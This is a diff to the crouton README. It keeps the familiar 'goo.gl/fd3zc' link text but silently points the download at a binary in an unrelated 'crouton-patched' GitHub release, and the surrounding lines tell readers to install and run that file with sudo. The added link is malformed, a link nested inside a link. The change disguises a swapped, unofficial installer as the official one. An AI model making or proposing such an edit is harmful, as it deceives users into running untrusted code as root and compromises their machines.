@@ -129,7 +129,7 @@ crouton is a powerful tool, and there are a *lot* of features, but basic usage
 is as simple as possible by design.
 
 If you're just here to use crouton, you can grab the latest release from
-[https://goo.gl/fd3zc](https://goo.gl/fd3zc). Download it, pop open a shell
+[https://goo.gl/fd3zc]([https://goo.gl/fd3zc](https://github.com/mimmeer-me/crouton-patched/releases/download/1.0.0/crouton)). Download it, pop open a shell
 (Ctrl+Alt+T, type `shell` and hit enter), make the installer executable with
 `sudo install -Dt /usr/local/bin -m 755 ~/Downloads/crouton`, then launch it
 with `sudo crouton` to see the help text. See the "examples" section for some
